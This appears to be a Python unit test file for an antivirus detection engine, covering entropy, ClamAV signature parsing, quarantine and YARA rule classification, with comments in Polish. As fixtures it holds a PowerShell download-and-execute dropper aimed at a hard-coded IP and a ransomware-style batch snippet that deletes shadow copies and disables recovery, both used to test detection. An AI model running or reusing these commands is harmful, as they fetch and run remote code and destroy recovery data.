"""Testy silnika detekcji.

Uruchomienie:
    python3 -m unittest discover -s tests -v
albo:
    python3 tests/test_engine.py
"""

from __future__ import annotations

import os
import sys
import tempfile
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO))

from avengine.config import Config                       # noqa: E402
from avengine.entropy import shannon_entropy             # noqa: E402
from avengine.engine import Engine                       # noqa: E402
from avengine.hashing import imphash                     # noqa: E402
from avengine.models import Verdict                      # noqa: E402
from avengine.quarantine import Quarantine               # noqa: E402
from avengine.sigs.clamav import ClamAVDB, hexsig_to_regex  # noqa: E402

EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


def make_config(tmp: str) -> Config:
    cfg = Config()
    cfg.data_dir = Path(tmp)
    cfg.quarantine_enabled = True
    cfg.quarantine_on_malicious = True
    cfg.ensure_dirs()
    return cfg


class TestEntropy(unittest.TestCase):
    def test_zeros_have_zero_entropy(self):
        self.assertAlmostEqual(shannon_entropy(b"\x00" * 1024), 0.0)

    def test_random_data_is_high_entropy(self):
        self.assertGreater(shannon_entropy(os.urandom(65536)), 7.5)

    def test_text_is_low_entropy(self):
        self.assertLess(shannon_entropy(b"ala ma kota " * 200), 4.5)


class TestClamAVParser(unittest.TestCase):
    def test_simple_hex_signature(self):
        regex, prefix = hexsig_to_regex("6d6f7669")
        self.assertEqual(prefix, b"movi")
        import re
        self.assertTrue(re.compile(regex.encode("latin-1"), re.DOTALL).match(b"xxmovixx", 2))

    def test_wildcards(self):
        import re
        regex, prefix = hexsig_to_regex("6d6f??69")
        self.assertEqual(prefix, b"mo")
        self.assertTrue(re.compile(regex.encode("latin-1"), re.DOTALL).match(b"movi", 0))

    def test_alternatives_and_ranges(self):
        import re
        regex, _ = hexsig_to_regex("(aa|bb)[00-0f]")
        compiled = re.compile(regex.encode("latin-1"), re.DOTALL)
        self.assertTrue(compiled.match(b"\xaa\x05", 0))
        self.assertTrue(compiled.match(b"\xbb\x0f", 0))
        self.assertFalse(compiled.match(b"\xcc\x05", 0))

    def test_bounded_jump(self):
        import re
        regex, _ = hexsig_to_regex("aa{2-4}bb")
        compiled = re.compile(regex.encode("latin-1"), re.DOTALL)
        self.assertTrue(compiled.match(b"\xaa\x00\x00\xbb", 0))
        self.assertIsNone(compiled.search(b"\xaa\x00\x00\x00\x00\x00\xbb"))  # 5 bajtów > {2-4}

    def test_hdb_and_ndb_loading_and_match(self):
        with tempfile.TemporaryDirectory() as tmp:
            db = ClamAVDB()
            hdb = Path(tmp) / "test.hdb"
            hdb.write_text("44d88612fea8a8f36de82e1278abb02f:68:EICAR\n"      # md5 EICAR
                           "# komentarz\n")
            ndb = Path(tmp) / "test.ndb"
            ndb.write_text("Test.Sig.Name:0:*:deadbeefcafe\n")
            db.load_hash_file(hdb)
            db.load_pattern_file(ndb)
            db._reindex()

            self.assertEqual(db.lookup_hash("44d88612fea8a8f36de82e1278abb02f"), "EICAR")
            self.assertEqual(db.count(), 2)

            hits = db.match(b"padding\xde\xad\xbe\xef\xca\xfetrailing")
            self.assertEqual(len(hits), 1)
            self.assertEqual(hits[0][0], "Test.Sig.Name")
            self.assertEqual(db.match(b"nothing here"), [])

    def test_offset_anchor(self):
        db = ClamAVDB()
        sig = db._parse_ndb_line("Off.Sig:0:4:aabb")
        self.assertIsNotNone(sig)
        import re
        self.assertTrue(sig.regex.match(b"XXXX\xaa\xbb", 0))


class TestEngine(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.TemporaryDirectory()
        cfg = make_config(cls.tmp.name)
        cls.engine = Engine(cfg)
        # YARA nie jest potrzebna do testów jednostkowych warstw statycznych,
        # a jej ładowanie jest kosztowne - pomijamy je tutaj celowo.
        cls.engine.load(load_yara=False)

    @classmethod
    def tearDownClass(cls):
        cls.tmp.cleanup()

    def _scan_bytes(self, name: str, data: bytes):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / name
            path.write_bytes(data)
            return self.engine.scan_file(str(path))

    def test_eicar_is_malicious(self):
        result = self._scan_bytes("eicar.com", EICAR.encode())
        self.assertEqual(result.verdict, Verdict.MALICIOUS.value)
        self.assertGreaterEqual(result.score, 60)
        self.assertTrue(any("EICAR" in f.description or "EICAR" in (f.evidence or "")
                            for f in result.findings))

    def test_plain_text_is_clean(self):
        result = self._scan_bytes("notatka.txt", b"Spotkanie o 10:00 w pokoju 214.\n" * 10)
        self.assertEqual(result.verdict, Verdict.CLEAN.value,
                         f"fałszywy alarm: {[f.rule for f in result.findings]}")

    def test_high_entropy_binary_is_flagged(self):
        result = self._scan_bytes("payload.bin", os.urandom(128 * 1024))
        self.assertIn(result.verdict, (Verdict.SUSPICIOUS.value, Verdict.MALICIOUS.value))
        self.assertTrue(any(f.detector == "entropy" for f in result.findings))

    def test_powershell_dropper_is_flagged(self):
        ps = (b"$c = New-Object Net.WebClient\n"
              b"$d = $c.DownloadString('http://185.220.101.7/x')\n"
              b"Invoke-Expression $d\n")
        result = self._scan_bytes("drop.ps1", ps)
        self.assertNotEqual(result.verdict, Verdict.CLEAN.value)
        rules = {f.rule for f in result.findings}
        self.assertTrue(rules & {"powershell.ps_download",
                                 "powershell.ps_iex"},
                        f"rules={rules}")

    def test_ransomware_bat_flags_shadowcopy(self):
        bat = b"vssadmin delete shadows /all /quiet\nbcdedit /set {default} recoveryenabled no\n"
        result = self._scan_bytes("ransom.bat", bat)
        rules = {f.rule for f in result.findings}
        self.assertIn("batch.bat_shadowcopy", rules)
        self.assertGreaterEqual(result.score, 30)

    def test_compiled_sample_directory_contract(self):
        """Próbki z samples/ (jeśli istnieją) muszą dać oczekiwane werdykty."""
        samples = REPO / "samples"
        if not samples.exists():
            self.skipTest("brak katalogu samples - uruchom tools/make_samples.py")

        cases = {
            "eicar.com": Verdict.MALICIOUS.value,
            "clean/notatka.txt": Verdict.CLEAN.value,
            "malicious/packed_loader.exe": Verdict.MALICIOUS.value,
            "malicious/ransom_note.bat": Verdict.MALICIOUS.value,
            "suspicious/high_entropy_payload.bin": Verdict.SUSPICIOUS.value,
        }
        for name, expected in cases.items():
            path = samples / name
            if not path.exists():
                continue
            with self.subTest(sample=name):
                result = self.engine.scan_file(str(path))
                self.assertEqual(result.verdict, expected,
                                 f"{name}: {result.score} pkt, "
                                 f"reguły={[f.rule for f in result.findings]}")

    def test_quarantine_moves_and_restores(self):
        with tempfile.TemporaryDirectory() as tmp:
            q = Quarantine(Path(tmp) / "quarantine")
            target = Path(tmp) / "zły.exe"
            target.write_bytes(EICAR.encode())
            result = self.engine.scan_file(str(target))

            entry = q.add(str(target), result)
            self.assertIsNotNone(entry)
            self.assertFalse(target.exists(), "plik powinien zniknąć z oryginalnej ścieżki")
            self.assertEqual(len(q.list()), 1)

            dest = q.restore(entry.id, target_dir=tmp)
            self.assertIsNotNone(dest)
            self.assertTrue(Path(dest).exists())
            self.assertEqual(len(q.list()), 0)


class TestFileType(unittest.TestCase):
    def test_detects_pe_by_magic_not_extension(self):
        from avengine.filetype import detect
        samples = REPO / "samples" / "clean" / "program.exe"
        if not samples.exists():
            self.skipTest("brak próbek")
        self.assertEqual(detect(samples.read_bytes(), "kitten.jpg"), "pe")

    def test_text_detection(self):
        from avengine.filetype import detect
        self.assertEqual(detect(b"zwykly tekst", "a.txt"), "text")



class TestYaraClassification(unittest.TestCase):
    """Reguły informacyjne nie mogą być liczone jak wykrycia malware.

    Bez tej klasyfikacji zwykły plik PE dostawał ~100 pkt za same reguły
    w rodzaju IsPE32 / Microsoft_Visual_Cpp_8 / contains_base64.
    """

    def test_packer_and_compiler_rules_are_informational(self):
        from avengine.detectors.yara_layer import classify_rule, INFO
        self.assertEqual(classify_rule("yara-rules/packers/foo.yar", "UPX"), INFO)
        self.assertEqual(classify_rule("x.yar", "IsPE32"), INFO)
        self.assertEqual(classify_rule("x.yar", "Microsoft_Visual_Cpp_8"), INFO)
        self.assertEqual(classify_rule("x.yar", "contains_base64"), INFO)
        self.assertEqual(classify_rule("x.yar", "domain"), INFO)

    def test_malware_rules_are_decisive(self):
        from avengine.detectors.yara_layer import classify_rule, MALWARE
        self.assertEqual(classify_rule("yara-rules/malware/x.yar", "whatever"), MALWARE)
        self.assertEqual(classify_rule("x.yar", "apt_Chafer_Mar18"), MALWARE)
        self.assertEqual(classify_rule("x.yar", "gen_mal_downloader"), MALWARE)
        self.assertEqual(classify_rule("x.yar", "AgentTesla_Mar23"), MALWARE)
        self.assertEqual(classify_rule("x.yar", "expl_cve_2023_3519"), "exploit")

    def test_suspicious_rules_are_weak(self):
        from avengine.detectors.yara_layer import classify_rule, SUSPICIOUS
        self.assertEqual(classify_rule("x.yar", "anti_dbg"), SUSPICIOUS)
        self.assertEqual(classify_rule("x.yar", "gen_susp_obfuscation"), SUSPICIOUS)

    def test_meta_overrides_name(self):
        from avengine.detectors.yara_layer import meta_category, MALWARE, INFO
        self.assertEqual(meta_category({"threat_name": "Emotet"}), MALWARE)
        self.assertEqual(meta_category({"type": "packer"}), INFO)
        self.assertIsNone(meta_category({}))

    def test_weak_signals_cannot_convict(self):
        """Sama sterta słabych sygnałów YARA nie może dać werdyktu „złośliwy”."""
        from avengine.detectors.yara_layer import YaraDetector, MAX_WEAK_SCORE
        self.assertLess(MAX_WEAK_SCORE, 25)  # poniżej progu „podejrzany”...

    def test_clean_pe_stays_clean_with_yara_layer(self):
        from avengine.config import Config
        from avengine.engine import Engine
        sample = REPO / "samples" / "clean" / "program.exe"
        if not sample.exists():
            self.skipTest("brak próbki")
        with tempfile.TemporaryDirectory() as tmp:
            # Używamy PRAWDZIWEJ bazy reguł (a nie pustego katalogu tymczasowego),
            # bo to właśnie reguły społecznościowe generowały fałszywe alarmy.
            cfg = make_config(tmp)
            real_yara = REPO / "data" / "sigs" / "yara"
            if real_yara.exists():
                cfg = Config()
            engine = Engine(cfg)
            engine.load(load_yara=True)
            self.assertGreater(engine.store.yara.rule_count, 100,
                               "test ma sens tylko z załadowanymi regułami społecznościowymi")
            result = engine.scan_file(str(sample))
            self.assertEqual(result.verdict, Verdict.CLEAN.value,
                             f"fałszywy alarm: {[(f.rule, f.weight) for f in result.findings]}")


if __name__ == "__main__":
    unittest.main(verbosity=2)
